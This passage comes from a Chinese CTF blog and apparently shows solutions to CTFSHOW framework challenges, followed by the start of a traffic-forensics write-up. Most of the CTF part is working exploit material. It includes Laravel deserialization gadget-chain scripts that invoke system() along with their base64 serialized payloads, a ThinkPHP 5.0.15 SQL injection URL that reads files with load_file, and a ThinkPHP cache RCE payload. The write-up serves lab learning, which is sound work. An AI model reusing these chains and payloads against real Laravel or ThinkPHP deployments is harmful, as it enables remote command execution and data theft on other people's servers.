class="variable">$seri</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Notifications</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">ChannelManager</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title class_">protected</span> $<span class="title class_">app</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$defaultChannel</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$customCreators</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;defaultChannel = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;customCreators = <span class="keyword">array</span>(<span class="string">&#x27;1&#x27;</span> =&gt; <span class="string">&#x27;system&#x27;</span>); </span><br><span class="line"><span class="variable language_">$this</span>-&gt;app = <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6OToiY2F0IC9mbGFnIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiIxIjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntpOjE7czo2OiJzeXN0ZW0iO319fQ==</span><br></pre></td></tr></table></figure><p>运行后会弹出一个调试页面，大概意思就是代码中尝试对一个字符串类型的变量调用对象的方法dispatch()，但是字符串类型本身没有dispatch()这个方法，所以导致错误</p><p><img src="https://oss.waynejoons.icu/picphoto/20250911200410761.png"></p><p>不影响，直接查看网页源码即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250911200436715.png"></p><h3 id="web469"><a href="#web469" class="headerlink" title="web469"></a>web469</h3><p>也是参考上一题的文章：<a href="https://www.cnblogs.com/shivers0x72/p/14800109.html">laravel5.4反序列化 - Shivers0x72</a></p><p>用最后一个方法，也就是<code>src/Faker/ValidGenerator.php</code>那个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">ValidGenerator</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;events = <span class="keyword">new</span> <span class="title class_">ValidGenerator</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$seri</span> = <span class="keyword">new</span> <span class="title class_">PendingBroadcast</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$seri</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">DefaultGenerator</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ValidGenerator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$maxRetries</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$validator</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$generator</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;generator = <span class="keyword">new</span> <span class="title class_">DefaultGenerator</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;maxRetries = <span class="number">10000000</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;validator = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">DefaultGenerator</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title class_">protected</span> $<span class="title class_">default</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="keyword">default</span> = <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086MjA6IkZha2VyXFZhbGlkR2VuZXJhdG9yIjozOntzOjEzOiIAKgBtYXhSZXRyaWVzIjtpOjEwMDAwMDAwO3M6MTI6IgAqAHZhbGlkYXRvciI7czo2OiJzeXN0ZW0iO3M6MTI6IgAqAGdlbmVyYXRvciI7TzoyMjoiRmFrZXJcRGVmYXVsdEdlbmVyYXRvciI6MTp7czoxMDoiACoAZGVmYXVsdCI7czo5OiJjYXQgL2ZsYWciO319fQ==</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250911202644387.png"></p><h3 id="web470"><a href="#web470" class="headerlink" title="web470"></a>web470</h3><p>跟上题方法一样，传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086MjA6IkZha2VyXFZhbGlkR2VuZXJhdG9yIjozOntzOjEzOiIAKgBtYXhSZXRyaWVzIjtpOjEwMDAwMDAwO3M6MTI6IgAqAHZhbGlkYXRvciI7czo2OiJzeXN0ZW0iO3M6MTI6IgAqAGdlbmVyYXRvciI7TzoyMjoiRmFrZXJcRGVmYXVsdEdlbmVyYXRvciI6MTp7czoxMDoiACoAZGVmYXVsdCI7czo5OiJjYXQgL2ZsYWciO319fQ==</span><br></pre></td></tr></table></figure><p>得到flag</p><h3 id="web471"><a href="#web471" class="headerlink" title="web471"></a>web471</h3><p>参考文章：<a href="https://blog.csdn.net/rfrder/article/details/113835057">laravel5.8 反序列化漏洞复现</a></p><p>用方法一，但是最后的输出要改一下，改成base64编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>\<span class="title class_">Dispatcher</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>\<span class="title">QueuedCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events=<span class="keyword">new</span> <span class="title class_">Dispatcher</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event=<span class="keyword">new</span> <span class="title class_">QueuedCommand</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>=&quot;<span class="title class_">cat</span> /<span class="title class_">flag</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>=&quot;<span class="title class_">system</span>&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>\<span class="title class_">PendingBroadcast</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingBroadcast</span>()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行得到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7Tzo0MzoiSWxsdW1pbmF0ZVxGb3VuZGF0aW9uXENvbnNvbGVcUXVldWVkQ29tbWFuZCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czo5OiJjYXQgL2ZsYWciO319</span><br></pre></td></tr></table></figure><p>运行后会弹出调试页面，大概意思是在调用 dispatchToQueue 方法时，尝试通过队列解析器（queueResolver）来获取一个队列实例（Queue对象），但实际得到的不是实现了 Queue 接口的对象，而是其他类型（如字符串、null或其他非队列对象）</p><p><img src="https://oss.waynejoons.icu/picphoto/20250911204906240.png"></p><p>但是不影响命令执行，查看网页源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250911204944715.png"></p><h3 id="web472"><a href="#web472" class="headerlink" title="web472"></a>web472</h3><p>可以继续用上题的payload，也可以学学新思路，但感觉方法都差不多</p><p>版本升到laravel8了，参考文章：<a href="https://blog.csdn.net/qq_38154820/article/details/114610513">Laravel 8 反序列化分析_laravel dispatch</a></p><p>要改一下格式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Contracts</span>\<span class="title class_">Events</span>\<span class="title class_">Dispatcher</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">BroadcastEvent</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">c</span> = <span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>\<span class="title class_">BroadcastEvent</span>(&#x27;<span class="title class_">cat</span> /<span class="title class_">flag</span>&#x27;);</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Bus\Dispatcher</span>(<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$a</span>, <span class="variable">$c</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6OToiY2F0IC9mbGFnIjt9czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9fQ==</span><br></pre></td></tr></table></figure><p>同样也是GET传入<code>/admin/序列化数据</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250911210429261.png"></p><h3 id="web473"><a href="#web473" class="headerlink" title="web473"></a>web473</h3><p>参考文章：<a href="https://www.cnblogs.com/Litsasuk/articles/18395417#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%E5%A4%84%E7%90%86%E8%BE%93%E5%85%A5">ThinkPHP 5.0.15 SQL注入漏洞</a></p><p>题目给出了thinkphp5.0.15默认控制器的部分代码，使用默认路由</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">inject</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="variable">$a</span>=<span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;a/a&#x27;</span>);</span><br><span class="line">     <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">insert</span>([<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$a</span>]);</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后payload要改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[0]=inc&amp;a[1]=(select load_file(&#x27;/flag&#x27;))&amp;a[2]=1</span><br></pre></td></tr></table></figure><p>我们用兼容模式传入路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=index/index/inject&amp;a[0]=inc&amp;a[1]=(select load_file(&#x27;/flag&#x27;))&amp;a[2]=1</span><br></pre></td></tr></table></figure><p>兼容模式也就是<code>index.php?s=模块/控制器/方法&amp;参数</code>，当然还有pathinfo模式，通过<code>index.php/模块/控制器/方法?参数</code> 形式传递，但是这里我用pathinfo模式失败了</p><p>得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250912112636859.png"></p><h3 id="web474"><a href="#web474" class="headerlink" title="web474"></a>web474</h3><p>参考文章：<a href="https://blog.csdn.net/rfrder/article/details/114599310">Thinkphp cache缓存函数远程代码执行漏洞</a></p><p>题目给出thinkphp5.0.5默认控制器的部分代码，使用默认路由</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title class_">Cache</span>::<span class="title function_ invoke__">set</span>(<span class="string">&quot;cache&quot;</span>,<span class="title function_ invoke__">input</span>(<span class="string">&#x27;get.cache&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public/index.php?s=index/index/rce&amp;cache=%0d%0asystem(&#x27;cat /flag&#x27;);//</span><br></pre></td></tr></table></figure><p>写入之后我们要访问文件，因为cache的md5值为<code>0fea6a13c52b4d4725368f24b045ca84</code>，根据文章可知，文件的存放路径为<code>/runtime/cache/0f/ea6a13c52b4d4725368f24b045ca84.php</code>，我们拼接访问该路径</p><p><img src="https://oss.waynejoons.icu/picphoto/20250912120130897.png"></p><p>得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250912120555575.png"></p><h3 id="web475"><a href="#web475" class="headerlink" title="web475"></a>web475</h3><p>后面两题题目备注thinkphp  5.0.0-5.0.23 rce，范围很大，可以自行测试Poc，这里我直接用工具做了</p><p>下载地址：<a href="https://github.com/bewhale/thinkphp_gui_tools">bewhale&#x2F;thinkphp_gui_tools: ThinkPHP漏洞综合利用工具</a></p><p>先检测看存在什么类型漏洞，然后一个个尝试，扫描<code>/public/index.php</code>不行，要扫描目录<code>/public</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250912122011198.png"></p><p>得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250912122049010.png"></p><h3 id="web476"><a href="#web476" class="headerlink" title="web476"></a>web476</h3><p>跟上面一样</p><p><img src="https://oss.waynejoons.icu/picphoto/20250912122408772.png"></p>]]></content>
    
    
    <summary type="html">CTFSHOW 框架复现专题题解</summary>
    
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/categories/CTFSHOW/"/>
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/tags/CTFSHOW/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | 第五届红明谷-异常行为溯源</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-Hongminggu-Forensics/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-Hongminggu-Forensics/</id>
    <published>2025-08-30T11:54:38.000Z</published>
    <updated>2025-11-10T04:12:44.343Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>某企业网络安全部门人员正在对企业网络资产受到的攻击行为进行溯源分析，该工作人员发现攻击者删除了一段时间内的访问日志数据，但是攻击者曾传输过已被删除的访问日志数据并且被流量监控设备捕获，工作人员对流量数据进行了初步过滤并提取出了相应数据包。已知该攻击者在开始时曾尝试低密度的攻击，发现未被相关安全人员及时发现后进行了连续多日的攻击，请协助企业排查并定位攻击者IP，flag格式为：flag{md5(IP)}</p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>打开pcap文件分析，可以看到里面都是TCP流量，点开流量发现Data数据为Base64编码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250830184554920.png"></p><p>复制ASCII文本，然后解码Base64数据，如图</p><p><img src="https://oss.waynejoons.icu/picphoto/20250830185632549.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250830185825365.png"></p><p>可以看到解码后得到一串Json数据，里面的<code>msg</code>对应的内容还是Base64编码，继续解码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250830192210747.png"></p><p>发现是一条<strong>日志数据</strong>，那我们的思路就是写个python脚本，遍历每一个数据包，寻找符合特定格式（以<code>eyJ</code>开头的Base64编码）的原始数据，再从中提取<code>msg</code>字段的值进行<strong>Base64解码</strong>，得到最终的日志文本</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> rdpcap, Raw</span><br><span class="line"></span><br><span class="line">PCAP_FILE = <span class="string">&#x27;network_traffic.pcap&#x27;</span></span><br><span class="line">LOG_FILE = <span class="string">&#x27;log.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 正在读取 <span class="subst">&#123;PCAP_FILE&#125;</span>...&quot;</span>)</span><br><span class="line">    packets = rdpcap(PCAP_FILE)</span><br><span class="line">    log_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(LOG_FILE, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> packet <span class="keyword">in</span> packets:</span><br><span class="line">            <span class="keyword">if</span> packet.haslayer(Raw):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    payload = packet[Raw].load</span><br><span class="line">                    <span class="comment"># Base64编码的JSON对象通常以&#x27;eyJ&#x27;开头</span></span><br><span class="line">                    start_index = payload.find(<span class="string">b&#x27;eyJ&#x27;</span>)</span><br><span class="line">                    <span class="keyword">if</span> start_index == -<span class="number">1</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                    b64_str_1 = payload[start_index:]</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 动态计算并补全缺失的&#x27;=&#x27;填充</span></span><br><span class="line">                    padding = <span class="string">b&#x27;=&#x27;</span> * (-<span class="built_in">len</span>(b64_str_1) % <span class="number">4</span>)</span><br><span class="line">                    json_data = json.loads(base64.b64decode(b64_str_1 + padding))</span><br><span class="line"></span><br><span class="line">                    log_entry_bytes = base64.b64decode(json_data[<span class="string">&#x27;msg&#x27;</span>])</span><br><span class="line">                    log_entry = log_entry_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    f.write(log_entry.strip() + <span class="string">&#x27;\n&#x27;</span>)</span><br><span 